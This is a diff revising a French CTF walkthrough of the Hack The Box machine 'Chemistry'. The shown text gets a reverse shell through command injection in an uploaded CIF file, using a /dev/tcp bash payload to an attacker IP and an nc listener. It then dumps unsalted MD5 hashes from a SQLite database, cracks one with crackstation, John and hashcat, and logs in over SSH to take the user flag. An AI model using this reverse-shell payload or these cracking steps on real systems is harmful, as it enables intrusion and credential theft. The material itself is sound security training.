@@ -739,15 +739,42 @@ L’erreur 500 n’est donc pas un échec : elle intervient après l’exécutio
 
 ### Reverse Shell
 
-Pour obtenir un `Reverse Shell`, il te suffit de remplacer `system ("ping -c 5 10.10.16.90")` par un payload de reverse shell, par exemple `system ("/bin/bash -c 'sh -i >& /dev/tcp/10.10.x.x/4444 0>&1'")`.
+La preuve d’exécution de code étant confirmée via le ping, l’étape suivante consiste logiquement à transformer cette exécution en accès interactif.
 
-- Sauvegarde le fichier en `revshell.cif`
-- Lance un listener du côté Kali `nc -lvnp 4444 `
-- `Uploade` et lance le `View` du fichier `revshell.cif` via l'interface web
+Tu ne modifies pas la structure du fichier CIF.
+ Tu changes uniquement la commande injectée dans os.system().
+
+Au lieu de :
+
+`system("ping -c 5 10.10.x.x")`
+
+tu injectes un payload de reverse shell, par exemple :
+
+`system("/bin/bash -c 'sh -i >& /dev/tcp/10.10.x.x/4444 0>&1'")`
+
+
+
+#### Préparation du listener
+
+Avant d’envoyer le fichier malveillant, tu dois impérativement préparer l’écoute côté Kali :
+
+```bash
+nc -lvnp 4444
+```
+
+#### Création du fichier revshell.cif
+
+Sauvegarde le fichier sous le nom revshell.cif en conservant la structure CIF valide et en ne modifiant que la commande injectée.
+
+Tu uploades ensuite le fichier via l’interface web, puis tu déclenches le view.
 
 ![reverse shell](view-revshell-cif.png)
 
-**Tu obtiens un Reverse Shell dans la fenêtre Kali que tu n'as plus qu'à stabiliser avec la recette {{< recette "stabiliser-reverse-shell" >}}.**
+Comme précédemment, une erreur 500 apparaît.
+
+Mais cette fois, la différence est visible côté Kali.
+
+Tu obtiens immédiatement un shell interactif :
 
 ```bash
 app@chemistry:~$ whoami
@@ -758,7 +785,15 @@ app@chemistry:~$ pwd
 /home/app
 ```
 
-### Exploration du Reverse Shell
+Le contexte confirme que :
+
+- le code s’exécute avec les droits de l’utilisateur app
+- tu es positionné dans /home/app
+- la RCE est pleinement exploitable
+
+À ce stade, tu stabilises le shell avec la recette {{< recette "stabiliser-reverse-shell" >}} afin d’obtenir un TTY propre.
+
+#### Exploration post-exploitation
 
 Une fois le reverse shell obtenu, tu commences par une reconnaissance basique du système.
 
@@ -771,10 +806,16 @@ drwxr-xr-x 8 app  app  4096 Oct  9  2024 app
 drwxr-xr-x 5 rosa rosa 4096 Jun 17  2024 rosa
 ```
 
-- `app`
-- `rosa`
+Deux utilisateurs apparaissent :
 
-En explorant le répertoire courant, tu identifies également le fichier `app.py` :
+- `app` (compte d’exécution de l’application)
+- `rosa` (utilisateur humain)
+
+Dans un contexte CTF, la présence d’un utilisateur distinct est immédiatement intéressante.
+
+#### Analyse du répertoire applicatif
+
+Depuis /home/app, tu observes :
 
 ```bash
 ls -l
@@ -787,33 +828,46 @@ drwx------ 2 app app 4096 Feb 17 11:00 uploads
 ls -l
 ```
 
-En consultant le fichier, tu identifies rapidement des informations exploitables.
+Le fichier `app.py` attire immédiatement l’attention.
 
 ```bash
 cat app.py
 ```
 
-Un élément attire immédiatement l’attention :
+Un élément clé apparaît :
 
 ```bash
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
 ```
 
-L’application utilise donc une base de données **SQLite** locale nommée `database.db`.
+L’application utilise donc une base SQLite locale.
 
-Tu peux également localiser rapidement le flag utilisateur avec :
+Dans un contexte web, cela signifie souvent :
+
+- stockage des utilisateurs
+- stockage des mots de passe
+- stockage de données internes
+
+C’est un pivot potentiel vers une élévation de privilèges.
+
+#### Localisation du flag utilisateur
+
+Recherche classique :
 
 ```bash
 find /home -type f -iname "user.txt" 2>/dev/null
 ```
 
-La commande retourne :
+Résultat :
 
 ```bash
 /home/rosa/user.txt
 ```
 
-Cela confirme que le flag se trouve dans le répertoire personnel de `rosa`
+Le flag appartient à `rosa`.
+Tu n’y as pas encore accès.
+
+**Il faut donc trouver un moyen de devenir rosa.**
 
 ------
 
@@ -823,10 +877,13 @@ Tu localises rapidement la base :
 
 ```bash
 find / -type f -iname "database.db" 2>/dev/null
+```
+
+```bash
 /home/app/instance/database.db
 ```
 
-Tu télécharges ensuite la base sur ta machine (recette {{< recette "copier-fichiers-kali" >}}) puis tu l’analyses avec `sqlite3` :
+Tu récupères ensuite la base sur ta machine Kali (recette {{< recette "copier-fichiers-kali" >}}) et tu l’analyses avec sqlite3 :
 
 ```
 sqlite3 database.db
@@ -834,15 +891,23 @@ sqlite3 database.db
 
 Les tables présentes sont :
 
-```
+```sqlite
 .tables
+```
+
+```sqlite
 structure  user
 ```
 
 La table `user` contient :
 
-```bash
+```sqlite
 SELECT * FROM user;
+```
+
+
+
+```bash
 1|admin|2861debaf8d99436a10ed6f75a252abf
 2|app|197865e46b878d9e74a0346b6d59886a
 3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
@@ -860,74 +925,36 @@ SELECT * FROM user;
 15|noelnac|ac703f164cd1abf7160bc4fda8099242
 ```
 
-On observe plusieurs comptes accompagnés de hash de mots de passe.
+On observe plusieurs comptes associés à des hash de 32 caractères hexadécimaux.
 
+Cela correspond fortement à des hash MD5 non salés.
 
+> Important : le hash est MD5 simple, sans sel.
+> C’est une très mauvaise pratique en production, mais classique en CTF.
 
 ------
 
 ### Extraction des credentials
 
-Sur l’ensemble des utilisateurs listés, le seul compte qui nous intéresse est `rosa`.
+L’utilisateur qui nous intéresse est rosa.
 
-Les valeurs ressemblent fortement à des **hash MD5** (32 caractères hexadécimaux).
+Son hash :
+
+```text
+63ed86ee9f624c7b14f1d4f43dc251a5
+```
+
+Dans un contexte CTF, plusieurs approches sont possibles :
+
+1. Service en ligne (rapide)
+2. John the Ripper
+3. Hashcat
+
+#### crackstation.net
 
 Le moyen le plus rapide consiste à soumettre ce hash à un site spécialisé comme `crackstation.net`
 
 ![crackstation.net pour casser le hash de l'utilisateur rosa](crackstation-rosa.png)
-
-Le hash associé à l’utilisateur `rosa` est rapidement résolu, ce qui donne :
-
-```bash
-rosa:unicorniosrosados
-```
-
-### Accès SSH et user.txt
-
-Dans beaucoup de CTF, le mot de passe extrait de la base fonctionne également pour SSH — il est donc logique de le tester
-
-```bash
-ssh rosa@chemistry.htb
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-rosa@chemistry.htb's password: 
-Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
-
-[...]
-
-rosa@chemistry:~$ 
-```
-
-Une fois connecté en SSH avec le compte `rosa`, tu peux vérifier le contenu de son répertoire personnel :
-
-```bash
-ls -l
-total 4
--rw-r----- 1 root rosa 33 Feb 17 10:23 user.txt
-```
-
-Le fichier `user.txt` apparaît immédiatement dans le dossier personnel.
-
-Il ne te reste plus qu’à l’afficher :
-
-```bash
-cat user.txt
-8acdxxxxxxxxxxxxxxxxxxxxxxxx4479
-```
-
-**Tu récupères ainsi facilement le flag user.txt**
-
-### Voie plus classique
-
-Tu peux également trouver les crédentiels en suivant une voie plus classique avec `John the Ripper` ou `hashcat` et la wordlist `rockyou.txt`
-
-
-
-```bash
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
-└─$ echo "63ed86ee9f624c7b14f1d4f43dc251a5" > hash.txt
-```
 
 #### John
 
@@ -1019,6 +1046,48 @@ Stopped: Sat Feb 14 10:56:13 2026
 └─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force --show
 63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
 ```
+
+#### Crédentiels de Rosa
+
+Le résultat est :
+
+**rosa:unicorniosrosados**
+
+### Accès SSH et user.txt
+
+Dans beaucoup de CTF, le mot de passe extrait de la base fonctionne également pour SSH — il est donc logique de le tester
+
+```bash
+ssh rosa@chemistry.htb
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+rosa@chemistry.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
+
+[...]
+
+rosa@chemistry:~$ 
+```
+
+Une fois connecté en SSH avec le compte `rosa`, tu peux vérifier le contenu de son répertoire personnel :
+
+```bash
+ls -l
+total 4
+-rw-r----- 1 root rosa 33 Feb 17 10:23 user.txt
+```
+
+Le fichier `user.txt` apparaît immédiatement dans le dossier personnel.
+
+Il ne te reste plus qu’à l’afficher :
+
+```bash
+cat user.txt
+8acdxxxxxxxxxxxxxxxxxxxxxxxx4479
+```
+
+**Tu récupères ainsi facilement le flag user.txt**
 
 
 
